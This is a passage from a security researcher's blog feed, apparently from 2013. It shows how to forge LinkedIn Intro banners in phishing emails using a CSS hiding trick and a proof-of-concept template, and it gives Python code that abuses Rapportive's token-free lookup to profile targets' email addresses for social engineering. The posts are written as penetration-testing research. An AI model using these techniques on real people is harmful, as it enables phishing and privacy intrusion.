<p>Intro works by first obtaining an OAuth access token to manage your email. They can get away with not asking for your Gmail password since <a href="https://developers.google.com/gmail/oauth_overview">Google implemented OAuth support into Gmail&rsquo;s IMAP and SMTP</a>. After Linkedin can access your email, they install a security profile onto your iPhone. The most notable feature of this security profile is that it installs a new email account pointing to Linkedin&rsquo;s IMAP and SMTP servers. I&rsquo;m not sure of a way to recover the email account password from the iPhone itself, but by intercepting the profile sent to the iPhone via a proxy, we can see that this email account looks like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='xml'><span class='line'><span class="nt">&lt;dict&gt;</span>
</span><span class='line'>    <span class="nt">&lt;key&gt;</span>PayloadDisplayName<span class="nt">&lt;/key&gt;&lt;string&gt;</span>Email Settings<span class="nt">&lt;/string&gt;</span>
</span><span class='line'>    <span class="nt">&lt;key&gt;</span>PayloadType<span class="nt">&lt;/key&gt;&lt;string&gt;</span>com.apple.mail.managed<span class="nt">&lt;/string&gt;</span>
</span><span class='line'>    <span class="nt">&lt;key&gt;</span>PayloadVersion<span class="nt">&lt;/key&gt;&lt;integer&gt;</span>1<span class="nt">&lt;/integer&gt;</span>
</span><span class='line'>    <span class="nt">&lt;key&gt;</span>PayloadUUID<span class="nt">&lt;/key&gt;&lt;string&gt;</span>[redacted]<span class="nt">&lt;/string&gt;</span>
</span><span class='line'>    <span class="nt">&lt;key&gt;</span>PayloadIdentifier<span class="nt">&lt;/key&gt;&lt;string&gt;</span>com.rapportive.iphone.settings.email.[redacted]<span class="nt">&lt;/string&gt;</span>
</span><span class='line'>    <span class="nt">&lt;key&gt;</span>EmailAccountName<span class="nt">&lt;/key&gt;&lt;string&gt;</span>Test Account<span class="nt">&lt;/string&gt;</span>
</span><span class='line'>    <span class="nt">&lt;key&gt;</span>EmailAccountType<span class="nt">&lt;/key&gt;&lt;string&gt;</span>EmailTypeIMAP<span class="nt">&lt;/string&gt;</span>
</span><span class='line'>    <span class="nt">&lt;key&gt;</span>EmailAddress<span class="nt">&lt;/key&gt;&lt;string&gt;</span>linkedin.intro.test@gmail.com<span class="nt">&lt;/string&gt;</span>
</span><span class='line'>    <span class="nt">&lt;key&gt;</span>EmailAccountDescription<span class="nt">&lt;/key&gt;&lt;string&gt;</span>Gmail +Intro<span class="nt">&lt;/string&gt;</span>
</span><span class='line'>    <span class="nt">&lt;key&gt;</span>IncomingMailServerAuthentication<span class="nt">&lt;/key&gt;&lt;string&gt;</span>EmailAuthPassword<span class="nt">&lt;/string&gt;</span>
</span><span class='line'>    <span class="nt">&lt;key&gt;</span>IncomingMailServerHostName<span class="nt">&lt;/key&gt;&lt;string&gt;</span>imap.intro.linkedin.com<span class="nt">&lt;/string&gt;</span>
</span><span class='line'>    <span class="nt">&lt;key&gt;</span>IncomingMailServerPortNumber<span class="nt">&lt;/key&gt;&lt;integer&gt;</span>143<span class="nt">&lt;/integer&gt;</span>
</span><span class='line'>    <span class="nt">&lt;key&gt;</span>IncomingMailServerUseSSL<span class="nt">&lt;/key&gt;&lt;true/&gt;</span>
</span><span class='line'>    <span class="nt">&lt;key&gt;</span>IncomingMailServerUsername<span class="nt">&lt;/key&gt;&lt;string&gt;</span>[username_redacted]<span class="nt">&lt;/string&gt;</span>
</span><span class='line'>    <span class="nt">&lt;key&gt;</span>IncomingPassword<span class="nt">&lt;/key&gt;&lt;string&gt;</span>[password_redacted]<span class="nt">&lt;/string&gt;</span>
</span><span class='line'>    <span class="nt">&lt;key&gt;</span>OutgoingPasswordSameAsIncomingPassword<span class="nt">&lt;/key&gt;&lt;true/&gt;</span>
</span><span class='line'>    <span class="nt">&lt;key&gt;</span>OutgoingMailServerAuthentication<span class="nt">&lt;/key&gt;&lt;string&gt;</span>EmailAuthPassword<span class="nt">&lt;/string&gt;</span>
</span><span class='line'>    <span class="nt">&lt;key&gt;</span>OutgoingMailServerHostName<span class="nt">&lt;/key&gt;&lt;string&gt;</span>smtp.intro.linkedin.com<span class="nt">&lt;/string&gt;</span>
</span><span class='line'>    <span class="nt">&lt;key&gt;</span>OutgoingMailServerPortNumber<span class="nt">&lt;/key&gt;&lt;integer&gt;</span>587<span class="nt">&lt;/integer&gt;</span>
</span><span class='line'>    <span class="nt">&lt;key&gt;</span>OutgoingMailServerUseSSL<span class="nt">&lt;/key&gt;&lt;true/&gt;</span>
</span><span class='line'>    <span class="nt">&lt;key&gt;</span>OutgoingMailServerUsername<span class="nt">&lt;/key&gt;&lt;string&gt;</span> Gmail +Intro ?[username_redacted]<span class="nt">&lt;/string&gt;</span>
</span><span class='line'>    <span class="nt">&lt;key&gt;</span>OutgoingPassword<span class="nt">&lt;/key&gt;&lt;string&gt;</span>[password_redacted]<span class="nt">&lt;/string&gt;</span>
</span><span class='line'><span class="nt">&lt;/dict&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>By intercepting the profile, we can get the username and password used to log into Linkedin&rsquo;s IMAP (imap.intro.linkedin.com) and SMTP (smtp.intro.linkedin.com) services. The username was a base64 encoded string, and the password was a 32 character hash.</p>

<p>Here&rsquo;s a diagram of how this works:</p>

<p><a href="http://jordan-wright.github.io/images/blog/intro_phish/diagram.png" target="_blank"><img src="http://jordan-wright.github.io/images/blog/intro_phish/diagram.png"/></a></p>

<p>Now that we have the username and password used for this mail account, let&rsquo;s grab the first email and see what content Linkedin&rsquo;s IMAP proxy injects into it. We can do this with OpenSSL.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='xml'><span class='line'># openssl s_client -connect imap.intro.linkedin.com:143 -starttls imap -crlf -quiet
</span><span class='line'>depth=2 C = US, O = &quot;thawte, Inc.&quot;, OU = Certification Services Division, OU = &quot;(c) 2006 thawte, Inc. - For authorized use only&quot;, CN = thawte Primary Root CA
</span><span class='line'>verify error:num=19:self signed certificate in certificate chain
</span><span class='line'>verify return:0
</span><span class='line'>. OK More capabilities after LOGIN
</span><span class='line'>a LOGIN username_redacted password_redacted
</span><span class='line'>* CAPABILITY IMAP4rev1 IDLE NAMESPACE ID CHILDREN UIDPLUS COMPRESS=DEFLATE
</span><span class='line'>A OK linkedin.intro.test@gmail.com Test Account authenticated (Success)
</span><span class='line'>b SELECT INBOX
</span><span class='line'>* FLAGS (\Answered \Flagged \Draft \Deleted \Seen)
</span><span class='line'>* OK [PERMANENTFLAGS (\Answered \Flagged \Draft \Deleted \Seen \*)] Flags permitted.
</span><span class='line'>* OK [UIDVALIDITY 1] UIDs valid.
</span><span class='line'>* 4 EXISTS
</span><span class='line'>* 0 RECENT
</span><span class='line'>* OK [UIDNEXT 5] Predicted next UID.
</span><span class='line'>* OK [HIGHESTMODSEQ 1049]
</span><span class='line'>b OK [READ-WRITE] INBOX selected. (Success)
</span><span class='line'>c FETCH 4 BODY[]
</span><span class='line'>* 4 FETCH (FLAGS (\Seen) BODY[] {36510}
</span><span class='line'>email_content_here
</span></code></pre></td></tr></table></div></figure>


<p>As it turns out, Linkedin injects quite a bit of content into your email. The basic structure looks like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="cp">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 4.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/REC-html40/loose.dtd&quot;&gt;</span>
</span><span class='line'><span class="nt">&lt;html&gt;</span>
</span><span class='line'>  <span class="nt">&lt;head&gt;</span>
</span><span class='line'>      <span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">&quot;Content-Type&quot;</span> <span class="na">content=</span><span class="s">&quot;text/html; charset=utf-8&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>      User specified CSS (if any)
</span><span class='line'>      <span class="nt">&lt;style </span><span class="na">type=</span><span class="s">&quot;text/css&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>          <span class="c">/*BEGIN RAPPORTIVE*/</span>
</span><span class='line'>          <span class="nt">Injected</span> <span class="nt">Linkedin</span> <span class="nt">Intro</span> <span class="nt">CSS</span>
</span><span class='line'>          <span class="c">/*END RAPPORTIVE*/</span>
</span><span class='line'>      <span class="nt">&lt;/style&gt;</span>
</span><span class='line'>  <span class="nt">&lt;/head&gt;</span>
</span><span class='line'>  <span class="nt">&lt;body&gt;</span>
</span><span class='line'>      <span class="c">&lt;!--BEGIN RAPPORTIVE--&gt;</span>
</span><span class='line'>      Injected Linkedin Intro HTML Content
</span><span class='line'>      <span class="c">&lt;!--END RAPPORTIVE--&gt;</span>
</span><span class='line'>      Original Message
</span><span class='line'>  <span class="nt">&lt;/body&gt;</span>
</span><span class='line'><span class="nt">&lt;/html&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>You can find the full email <a href="https://gist.github.com/jordan-wright/7189765#file-original_email-html">here</a> (some links and what-not have been redacted). Now that we know what Linkedin does to the email, let&rsquo;s see how we can use it to make our phishing emails appear to be legitimate.</p>

<h3>Setting up the Bait</h3>

<p>Just like setting up a spoofed website, we can simply copy the existing CSS and HTML structure provided by Linkedin, and repurpose it for our needs. The first thing we will want to do is to find a way to get rid of the existing Intro data. We can do this by setting the CSS for the existing Intro block to <code>display:none;</code>. Unfortunately for us, Linkedin obviously considered this, since the CSS is usually injected at the end of our <code>head</code> block, and they were pretty specific in ensuring the <code>!important</code> keyword is set for things such as the display, height, etc.</p>

<p>But they weren&rsquo;t specific enough. If we look at the CSS, we can see that the rules apply to the <code>#rapportive.iphone</code> element. If we look closely, we can see that in fact the HTML element we want to hide has a full spec of <code>#rapportive.rapportive.topbar.iphone</code>. Therefore, we can simply set the following style block to hide the element:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='css'><span class='line'><span class="o">&lt;</span><span class="nt">style</span> <span class="nt">type</span><span class="o">=</span><span class="s2">&quot;text/css&quot;</span><span class="o">&gt;</span>
</span><span class='line'>    <span class="nf">#rapportive</span><span class="nc">.rapportive.topbar.iphone</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">display</span><span class="o">:</span><span class="k">none</span> <span class="cp">!important</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="o">&lt;/</span><span class="nt">style</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Easy as that.</p>

<p>Now that we have removed the existing Intro data, we are free to inject our own. To do this, we can copy the existing HTML provided by Linkedin. To make sure that our data is not hidden by our previous CSS, we can simply remove the <code>topbar</code> class from the root element, since it will have no effect on styling. The last things we will want to do are to clean up the margins Linkedin puts on the original message, as well as changing the actual data itself to be whatever we want. In addition to this, I copied some of the CSS and HTML and changed the IDs which are generated automatically. This will make sure our template is always consistent.</p>

<h3>Going Phishing</h3>

<p>I&rsquo;ve taken the liberty of setting up a basic PoC <a href="https://gist.github.com/jordan-wright/7189765#file-template-html">template</a> for educational purposes. To use it, just visit the Linkedin profile for the person you are pretexting as, and fill in the CSS information as needed. Ideally, in the future there could be improvements to automatically scrape this information, check to make sure that the Intro data is only shown on mobile devices, etc. For now &ndash; it works. Let&rsquo;s see what it looks like if I spoof the example from Linkedin&rsquo;s original post, David (pardon the non-IOS7 &ndash; I don&rsquo;t see any major IOS7 styling issues which would cause much trouble):</p>

<p><a href="http://jordan-wright.github.io/images/blog/intro_phish/david.png" target="_blank"><img style="display:block; margin:auto;" src="http://jordan-wright.github.io/images/blog/intro_phish/david.png"/></a></p>

<p>Here&rsquo;s what the details look like when I open the Intro tab (they are customizable as well &ndash; I left them as me to show that I really do control the content):</p>

<p><a href="http://jordan-wright.github.io/images/blog/intro_phish/david_details.png" target="_blank"><img style="display:block; margin:auto;" src="http://jordan-wright.github.io/images/blog/intro_phish/david_details.png"/></a></p>

<p>Obviously, this was an extremely benign example. It would be just as easy to attach a malicious payload, request sensitive information, etc.</p>

<h3>Final Thoughts</h3>

<p>While Linkedin Intro <em>seems</em> like it would be useful on the surface &ndash; the security risks of using it are simply too high. With that being said, as a social engineer, <strong><em>I hope my targets use Intro</em></strong>. By giving users a false sense of security when they see the Intro information in an email, Linkedin has made my pretext much stronger and the SE engagement that much easier.</p>

<p>I have yet to get comments setup on the new blog, but <a href="http://jordan-wright.github.io/contact">shoot me an email</a> if you have any questions or comments!</p>

<p>Jordan</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Automated Social Engineering Recon Using Rapportive]]></title>
    <link href="http://jordan-wright.github.io/blog/2013/10/14/automated-social-engineering-recon-using-rapportive/"/>
    <updated>2013-10-14T02:55:00-05:00</updated>
    <id>http://jordan-wright.github.io/blog/2013/10/14/automated-social-engineering-recon-using-rapportive</id>
    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/rapportive_small.png"/></p>

<h3>Introduction</h3>

<p>When performing a social engineering engagement, recon is key. In a <a href="http://raidersec.blogspot.com/2012/12/automated-open-source-intelligence.html">previous post</a>, I demonstrated a few ways in which we could automate the recon process. However, the methods I showed were simply ways to find the profiles of people that might belong to a particular organization.</p>

<p>During SE engagements, we often either run across email addresses (by, say, simply scraping the main website) or want to enumerate the email address structure in use by an organization (generating possible alternatives using tools like jigsaw.rb). It would be helpful if it were possible to automate the process of validating those email addresses by associating them to additional information or social networking profiles. This is where Rapportive comes in handy.</p>

<!-- more -->


<h3>What is Rapportive?</h3>

<p><a href="http://rapportive.com/">Rapporitve</a>, acquired by Linkedin in February 2012, is an add-on for multiple browsers which embeds information about your contacts directly into Gmail. The extension sends your contact&rsquo;s email address to the Rapportive server, which responds with known public information associated with the email address such as social networking profiles.</p>

<h3>Reverse Engineering the Rapportive Extension</h3>

<p>Let&rsquo;s take a look at how the Rapportive Extension works (disclosure: I&rsquo;m using Chrome). The extension simply consists of a Javascript file called &ldquo;user.js&rdquo;. When we navigate to Gmail, this file will load another JS file called <a href="https://rapportive.com/load/launchpad">&ldquo;launchpad&rdquo;</a>. The launchpad file then fetches the main file called <a href="https://rapportive.com/load/application">&ldquo;application&rdquo;</a>, which implements all the functionality provided by Rapportive. If you want to do a full static analysis of them &ndash; feel free. For this post, we&rsquo;ll take a look at the behavior of the extension, and see if we can automate its functionality.</p>

<p>Here are the requests made when using the extension:</p>

<p><a href="http://jordan-wright.github.io/images/blog/rapportive/burp.png" target="_blank"><img src="http://jordan-wright.github.io/images/blog/rapportive/burp.png"/></a></p>

<p>There are two interesting requests to note. The first one is a call to /immediate_login. This is used to login to Rapportive using Google&rsquo;s <a href="https://developers.google.com/accounts/docs/OpenID">OpenID</a>. The next request to note is to /contacts/email?[target_email]. This is the call made when we open an email from one of our contacts. Here is an example of the data returned (I&rsquo;ve only removed unneccessary data for brevity):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>{
</span><span class='line'>   "contact":{
</span><span class='line'>      "image_url_raw":"https:\/\/secure.gravatar.com\/avatar\/97754d23d40bbe7dce50f3424991b697?s=80&d=404",
</span><span class='line'>      "raplets":[],
</span><span class='line'>      "memberships":[
</span><span class='line'>         {
</span><span class='line'>            "profile_url":"http:\/\/www.linkedin.com\/pub\/54\/795\/752",
</span><span class='line'>            "view_text":"",
</span><span class='line'>            "site_name":"LinkedIn",
</span><span class='line'>         },
</span><span class='line'>         {
</span><span class='line'>            "display_name":"Blogger",
</span><span class='line'>            "username":null,
</span><span class='line'>            "profile_url":"http:\/\/raidersec.blogspot.com",
</span><span class='line'>            "view_text":"View Jordan's profile on Blogger",
</span><span class='line'>            "site_name":"Blogger",
</span><span class='line'>         },
</span><span class='line'>         {
</span><span class='line'>            "display_name":"GitHub",
</span><span class='line'>            "username":"jordan-wright",
</span><span class='line'>            "profile_id":"jordan-wright",
</span><span class='line'>            "profile_url":"https:\/\/github.com\/jordan-wright",
</span><span class='line'>            "view_text":"View Jordan's profile on GitHub",
</span><span class='line'>            "site_name":"GitHub",
</span><span class='line'>         }
</span><span class='line'>      ],
</span><span class='line'>      "headline":"Jordan Wright - Security Engineer",
</span><span class='line'>      "email":"jmwright798@gmail.com",
</span><span class='line'>      "location":"Texas Area",
</span><span class='line'>      "occupations":[
</span><span class='line'>         {
</span><span class='line'>            "job_title":"Security Engineer"
</span><span class='line'>         }
</span><span class='line'>      ],
</span><span class='line'>      "name":"Jordan Wright",
</span><span class='line'>   },
</span><span class='line'>   "success":"image_or_occupation_or_useful_membership",
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>We can see that quite a bit of data was returned by this query. As social engineers, not only would we know that this is likely a valid email address (and therefore a valid email address format for other potential targets of the same organization), but we could also see the social networking profiles linked to this email address. This could reveal other infrmation which may be useful to us later.</p>

<p>So now we want to see how we can:</p>

<ul>
<li>Automate the login process (<em>if needed</em>)</li>
<li>Deconstruct the /contact/email query to find any special parameters that we need to pass</li>
</ul>


<p>Let&rsquo;s start by taking a look at the parameters passed to the /contact/email request, and see what kind of information is needed:</p>

<p><a href="http://jordan-wright.github.io/images/blog/rapportive/contact_email_headers.png" target="_blank"><img src="http://jordan-wright.github.io/images/blog/rapportive/contact_email_headers.png"/></a></p>

<p>We can immediately see an interesting header being sent with the request titled &ldquo;X-Session-Token&rdquo;. It turns out that <strong>the entire authentication of the request relies on sending this token</strong>. We can test this using an API console like <a href="https://apigee.com/console/others">this one</a>.</p>

<p>Now we just need to figure out where to get our session token. There was one request that Burp didn&rsquo;t catch that is made once we first log into Gmail. It is a request to /login_status?[email_address]. The response to this query looks like this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>{
</span><span class='line'>   "user_full_name":" ",
</span><span class='line'>   "status":200,
</span><span class='line'>   "authenticated_as":null,
</span><span class='line'>   "active_auths":[],
</span><span class='line'>   "claimed_emails":null,
</span><span class='line'>   "plan":{
</span><span class='line'>      "key":"free",
</span><span class='line'>      "price":0,
</span><span class='line'>      "name":"Free"
</span><span class='line'>   },
</span><span class='line'>   "session_token":"BAgiX09ON0&lt;snip&lt;ece684be8",
</span><span class='line'>   "user_preferences":{&lt;snip&lt;},
</span><span class='line'>   "authenticity_token":"7KNIosqb&lt;snip&gt;csaXzbQFOFi7jg=",
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>This request will return a session token for the currently logged in user. However, here&rsquo;s the trick: <strong><em>any email will work</em></strong>. Seriously &ndash; <a href="http://rapportive.com/login_status?user_email=this_doesnt_exist_@gmail.com">try it</a>. Even without being logged in to Rapportive (ie, by using a random email address), we can still receive a session token and can still make valid queries on email addresses like the one seen originally. So &ndash; we don&rsquo;t need to worry about automating the authentication.</p>

<p>Let&rsquo;s take a look at how we can at least automate the process of getting the session token and querying for an email address.</p>

<h3>Automating Rapportive Queries</h3>

<p>Now that we know how Rapportive works, we can automate the process to perform lookups for users of our choosing. Let&rsquo;s start by getting the session token for a particular email address:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>import requests
</span><span class='line'>random_email = 'asdfqwer@gmail.com'
</span><span class='line'>response = requests.get('https://rapportive.com/login_status?user_email=' + random_email).json()
</span><span class='line'>print response['session_token']
</span><span class='line'># output - BAgiX0IvUmJHMUQ3Z2pOUWhmM0ZKRX...</span></code></pre></td></tr></table></div></figure>


<p>Easy as that! Now that we have the session token, we can make a request for a given target email address as follows:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>profile = requests.get('https://profiles.rapportive.com/contacts/email/' + target_email, 
</span><span class='line'>            headers = {'X-Session-Token' : response['session_token']}).json()</span></code></pre></td></tr></table></div></figure>


<p>The profile returned will now be in JSON format where we can parse out any information such as social networking profile links, usernames, etc. I won&rsquo;t bore you with the implementation of all the parsing &ndash; so let&rsquo;s move onto the final script!</p>

<h3>Introducing rapportive.py</h3>

<p>I&rsquo;ve created a simple Python script called <a href="https://github.com/jordan-wright/rapportive">rapportive.py</a> to do this work for us. It takes in a list of email addresses from STDIN or a single email via the -e argument and prints out any results found. This can be useful if we want to pass in emails from other tools such as <a href="https://github.com/pentestgeek/jigsaw/blob/master/jigsaw.rb">jigsaw.rb</a>. It can also log to an output file, if needed.</p>

<p>Here is an example of how to use it:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>~# cat emails.txt | ./rapportive.py
</span><span class='line'>10-25 23:37 rapportive   INFO     Using owcdf@gmail.com
</span><span class='line'>10-25 23:37 rapportive   INFO     Found match for jmwright798@gmail.com
</span><span class='line'>
</span><span class='line'>Name: Jordan Wright
</span><span class='line'>Position: Security  Engineer
</span><span class='line'>Company: CoNetrix
</span><span class='line'>        LinkedIn - http://www.linkedin.com/pub/54/795/752
</span><span class='line'>        Blogger - http://raidersec.blogspot.com
</span><span class='line'>        GitHub - https://github.com/jordan-wright</span></code></pre></td></tr></table></div></figure>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>~# ./rapportive.py -e jmwright798@gmail.com
</span><span class='line'>10-25 23:31 rapportive   INFO     Using ntmai@gmail.com
</span><span class='line'>10-25 23:31 rapportive   INFO     Found match for jmwright798@gmail.com
</span><span class='line'>Name: Jordan Wright
</span><span class='line'>Position: Security  Engineer
</span><span class='line'>Company: CoNetrix
</span><span class='line'>        LinkedIn - http://www.linkedin.com/pub/54/795/752
</span><span class='line'>        Blogger - http://raidersec.blogspot.com
</span><span class='line'>        GitHub - https://github.com/jordan-wright
</span></code></pre></td></tr></table></div></figure>


<p>You can find it on <a href="https://github.com/jordan-wright/rapportive">Github</a>.</p>

<p>Enjoy!</p>

<p>Jordan</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hello World!]]></title>
    <link href="http://jordan-wright.github.io/blog/2013/10/11/hello-world/"/>
    <updated>2013-10-11T02:25:00-05:00</updated>
    <id>http://jordan-wright.github.io/blog/2013/10/11/hello-world</id>
    <content type="html"><![CDATA[<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#!/usr/bin/env python
</span><span class='line'>print 'Hello, World!'</span></code></pre></td></tr></table></div></figure>


<p>Hi there! My name is Jordan, and I am a security researcher, developer, and hobbyist.</p>

<p>For the past few years, I created and maintained a blog for an organization I started called <a href="http://raidersec.blogspot.com">Raidersec</a>. While I fully intend to leave the existing content on the Raidersec blog, I thought it would be ideal to create a personal blog on which I can continue writing about my research and projects dealing with not just security, but programming in general.</p>

<p>I have quite a few projects in the works that I am excited to share soon! For now, feel free to check out my <a href="http://jordan-wright.github.io/projects">existing projects</a>, and <a href="http://jordan-wright.github.io/contact">let me know</a> if you have any questions or comments!</p>

<p>-J</p>
]]></content>
  </entry>
  
</feed>
